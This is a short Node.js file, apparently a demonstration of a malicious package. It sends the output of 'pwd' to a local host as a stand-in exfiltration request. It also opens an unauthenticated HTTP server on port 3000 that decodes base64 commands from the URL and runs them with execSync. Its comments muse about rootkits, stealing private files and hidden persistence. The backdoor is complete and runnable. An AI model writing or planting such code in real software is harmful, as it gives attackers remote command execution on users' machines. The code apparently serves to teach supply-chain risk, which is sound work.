const http = require("http");
const execSync = require("child_process").execSync;

/**
 * Our malicious code start by listing what directory we are in.
 * 
 * What if we did something worse like download a rootkit or
 * grab all the private files?
 */
http.get(
  `http://localhost:3001/${Buffer.from(execSync("pwd"), "base64").toString("base64")}`
);

/**
 * How about setting up a proxy server that will allow an attacker to
 * send commands to the computer our code is running on and what if
 * we run this server as a hidden process that starts on reboot?
 */
const server = http.createServer((req, res) => {
  let result = "";

  try {
    const base64Command = req.url.slice(1);
    const commandString = Buffer.from(base64Command, "base64").toString("utf8");
    result = execSync(commandString);
  } catch (e) {
    result = e.message;
  }

  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end(result.toString("utf8"));
});

server.listen(3000);
